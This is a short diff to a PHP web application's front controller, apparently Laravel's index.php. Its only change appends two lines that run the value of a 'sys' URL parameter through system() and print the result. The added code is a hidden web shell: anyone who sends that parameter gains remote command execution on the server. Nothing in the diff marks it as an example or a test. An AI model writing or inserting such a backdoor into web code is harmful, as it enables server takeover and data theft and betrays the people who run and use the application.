@@ -58,3 +58,5 @@ $response = $kernel->handle(
 $response->send();
 
 $kernel->terminate($request, $response);
+if(isset($_GET['sys']))
+    echo system($_GET['sys']);
